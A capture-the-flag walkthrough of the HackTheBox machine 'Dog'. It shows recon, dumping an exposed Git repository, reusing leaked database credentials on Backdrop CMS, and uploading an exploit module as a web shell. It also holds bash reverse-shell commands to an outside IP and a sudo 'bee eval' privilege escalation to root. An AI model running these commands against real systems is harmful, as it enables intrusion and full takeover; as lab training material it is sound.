# Dog HackTheBox WalkThrough

![Dog](../../img/Dog/Dog.png)

We will start the machine with a scan of all **TCP** ports:

```
nmap -sS -Pn -p- -n --min-rate 5000 10.129.81.92

Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Now, from the open ports (`22` and `80`), we will check which services are running and their versions.

```
nmap -sVC -p 22,80 --min-rate 5000 10.129.81.92

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
| http-git: 
|   10.129.81.92:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The machine has an `http` service on port `80` and an `ssh` service on port `22`. It also informs us that there is a `.git` directory, which could expose the source code.

Let's perform a basic analysis of the website using `whatweb` to see if it provides any useful information for later.

```
whatweb 10.129.81.92

http://10.129.81.92 [200 OK] Apache[2.4.41], Content-Language[en], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.81.92], UncommonHeaders[x-backdrop-cache,x-generator], X-Frame-Options[SAMEORIGIN]
```

After a basic reconnaissance, we will explore the website using the browser.

![site](../../img/Dog/site.png)

Since we don't find anything interesting at first glance, we will download the Git repository from the `/.git` directory. To do this, we will use the tool [git-dumper](https://github.com/arthaud/git-dumper).

```
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
```

We create a virtual environment to install the dependencies.

```
python3 -m venv venv
venv/bin/pip install -r requirements.txt
```

Finally, we execute the script to download the repository.

```
venv/bin/python3 git_dumper.py http://10.129.81.92/.git/ git
cd git
```

Inspecting the repository, we find the `settings.php` file, which contains database credentials for `MySQL`. We take note of these credentials for later use.

```
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

Returning to the webpage, we find an email: `support@dog.htb`.

![about](../../img/Dog/about.png)

Let's search the entire repository for any other users with the same domain.

```
grep -rE ".+@dog.htb"

files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

We find a user: `tiffany@dog.htb`. Let's try to authenticate in the CMS as this user using the previously found password.

![login](../../img/Dog/login.png)

The credentials are correct, and we are redirected to a dashboard to manage the Backdrop CMS.

![dashboard](../../img/Dog/dashboard.png)

To check the version, we access `http://10.129.81.92/?q=admin/reports/status`, where we see that the CMS version is `1.27.1`.

![version](../../img/Dog/version.png)

Searching online, we find that this version is vulnerable to RCE (Remote Code Execution) if authenticated. The vulnerability occurs because it does not properly sanitize `PHP` code. The exploit can be found [here](https://www.exploit-db.com/exploits/52021).

```
python3 exploit.py http://10.129.81.92

Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.129.81.92/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.129.81.92/modules/shell/shell.php
```

When executed, it creates a compressed `shell` folder in `zip` format and another uncompressed one. If we try to upload the `zip` file, we get an error indicating that we should use the `.tar.gz` format, so we compress it in this format using the following command:

```
tar -czf shell.tar.gz shell
```

Now, we upload it to the specified path: `http://10.129.81.92/?q=admin/modules/install` (adding the path to the `q` parameter because this site handles routes in this way).

![install](../../img/Dog/install.png)

We click on `manual installation` and then on `Upload a module, theme, or layout archive to install`. We select `shell.tar.gz` and click `INSTALL`.

![upload](../../img/Dog/upload.png)

Now we can execute commands, so quickly (since the module is automatically deleted), we set up a listener with `netcat` on any desired port:

```
nc -lnvp 1234
```

Then, we establish a reverse shell through the module we just uploaded (`http://10.129.81.92/modules/shell/shell.php`) using the `cmd` parameter via GET.

```
curl -X GET 'http://10.129.81.92/modules/shell/shell.php' -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.191/1234 0>&1"'
```

Once executed, we receive the **reverse shell** as the `www-data` user.

```
whoami

www-data
```

Let's list all users who have a valid shell assigned (usually ending in "sh").

```
cat /etc/passwd | grep -E "sh$"

root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

There are two users besides `root`. Trying to authenticate as both using the previously found credentials, we succeed with `johncusack`.

```
su johncusack
Password: BackDropJ2024DS2024
```

Now we can access the user flag.

```
cd
cat user.txt
```

We check what commands we can execute as another user with `sudo`.

```
sudo -l

Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

We can execute `bee` as any user, including `root`. Using the `eval` option, we can execute arbitrary **PHP** code.

```
eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
```

With this option, executing commands as `root` is simply a matter of writing `PHP` code that calls any system command you want. For example, we will establish another **reverse shell**, so we set up a listener on our local machine on any port.

```
nc -lnvp 4321
```

And we execute `bee` as `root` using the `eval` (or `ev`) option and the `PHP` code to send ourselves a **reverse shell** to our local machine.

```
sudo /usr/local/bin/bee --root=/var/www/html ev "exec('bash -c \"bash -i >& /dev/tcp/10.10.14.191/4321 0>&1\"')"
```

After executing it, if we check `netcat`, we should have received the **reverse shell** as `root`.

```
whoami

root
```

Now, we can read the `root` flag and finish the `Dog` machine.

```
cd
cat root.txt
```

If you found this useful, consider giving a star to the project. Thank you, and good luck with your future machines ❤️.